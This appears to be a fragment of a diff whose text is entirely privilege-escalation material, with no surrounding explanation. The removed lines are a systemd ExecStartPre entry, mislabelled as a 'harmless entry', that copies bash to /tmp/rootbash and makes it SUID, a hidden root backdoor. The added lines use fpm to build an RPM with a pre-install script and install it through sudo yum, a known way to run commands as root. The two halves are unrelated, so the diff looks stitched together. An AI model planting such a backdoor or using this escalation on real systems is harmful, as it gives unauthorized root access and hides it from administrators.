@@ -1,3 +1,4 @@
-
-; harmless entry
-ExecStartPre=/bin/bash -c "cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash"
+TF=$(mktemp -d)
+echo 'id' > $TF/x.sh
+fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
+sudo yum localinstall -y x-1.0-1.noarch.rpm
